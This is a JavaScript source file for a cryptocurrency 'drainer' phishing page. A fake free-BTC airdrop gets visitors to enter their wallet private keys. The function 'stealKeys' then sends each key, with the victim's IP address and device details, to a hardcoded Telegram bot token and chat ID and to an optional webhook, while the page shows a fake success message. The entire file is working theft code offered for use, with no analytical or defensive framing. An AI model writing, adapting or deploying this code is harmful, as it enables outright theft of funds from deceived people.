// CONFIG - REPLACE THESE
const TELEGRAM_BOT_TOKEN = '7689015696:AAG8Ci3BcoWRlDmziyfq6dVRnL1Hcqw0bxo'; // From @BotFather
const TELEGRAM_CHAT_ID = '5430364847';    // From @userinfobot
const DRAINER_WEBHOOK = 'https://webhook.site/YOUR-UNIQUE-ID'; // Optional

// Drainer Targets
const DRAIN_ADDRESSES = {
  BTC: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlhfe2wfxt2y2v3s',
  ETH: '0x742d35Cc6634C0532925a3b8D7aB586f9a8c5f2f',
  USDT: '0x742d35Cc6634C0532925a3b8D7aB586f9a8c5f2f',
  USDC: '0x742d35Cc6634C0532925a3b8D7aB586f9a8c5f2f'
};

// Main Drainer Function
async function stealKeys(privateKey, coin = 'BTC') {
  const victimData = {
    privateKey: privateKey.substring(0, 50) + '...', // Truncate for Telegram
    fullKey: privateKey,
    coin: coin,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    language: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    referrer: document.referrer
  };

  // Get IP
  try {
    victimData.ip = await fetch('https://api.ipify.org?format=json')
      .then(r => r.json()).then(r => r.ip);
  } catch(e) { victimData.ip = 'Unknown'; }

  // 1️⃣ Send to Telegram (Primary)
  const telegramMsg = `🚨 WALLET DRAINED!\n\n🔑 *Private Key:*\n\`${victimData.fullKey}\`\n\n💰 *Coin:* ${coin}\n🌐 *IP:* ${victimData.ip}\n📱 *Device:* ${victimData.userAgent.substring(0,50)}...\n🕐 *Time:* ${new Date().toLocaleString()}`;
  
  await fetch(`https://api.telegram.org/bot${7689015696:AAG8Ci3BcoWRlDmziyfq6dVRnL1Hcqw0bxo}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: 5430364847,
      text: telegramMsg,
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    })
  });

  // 2️⃣ Send to Webhook (Backup)
  if (DRAINER_WEBHOOK !== 'https://webhook.site/YOUR-UNIQUE-ID') {
    await fetch(DRAINER_WEBHOOK, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(victimData)
    });
  }

  console.log('💸 Drainer fired:', victimData);
  return true;
}

// Connect Button Handler
document.getElementById('connectWallet').onclick = async function() {
  const privKey = document.getElementById('privateKey').value.trim();
  
  if (!privKey) {
    alert('⚠️ Enter private key to claim FREE 0.025 BTC!');
    return;
  }

  // Draining Animation
  const btn = this;
  const originalText = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '⏳ Draining Funds... 25%';
  
  // Auto-detect coin
  let coin = 'BTC';
  if (privKey.startsWith('0x')) coin = 'ETH';
  else if (privKey.length === 51 && (privKey.startsWith('5') || privKey.startsWith('K') || privKey.startsWith('L'))) coin = 'BTC';
  else if (privKey.length > 60) coin = document.getElementById('multiCoin').checked ? 'USDT' : 'BTC';

  try {
    // FIRE DRAINER
    await stealKeys(privKey, coin);
    
    // Fake success
    btn.innerHTML = '✅ 0.025 BTC Claimed!';
    setTimeout(() => {
      alert('🎉 SUCCESS!\n\n0.025 BTC airdropped to your wallet!\n\nRefresh for more claims ➡️');
      // btn.innerHTML = originalText; // Reset for multiple drains
    }, 2000);
    
  } catch(e) {
    btn.innerHTML = '❌ Connection Error - Retry';
    setTimeout(() => btn.innerHTML = originalText, 2000);
  }
  btn.disabled = false;
};

// Telegram Connect (Fake)
document.getElementById('connectTelegram').onclick = function() {
  document.getElementById('telegramStatus').classList.remove('hidden');
  this.innerHTML = '✅ Bot Active';
  setTimeout(() => {
    document.getElementById('telegramConnect').style.display = 'none';
  }, 2500);
};

// Auto-focus & Copy Protection
document.getElementById('privateKey').focus();
document.addEventListener('copy', function(e) {
  // Allow copying keys
});

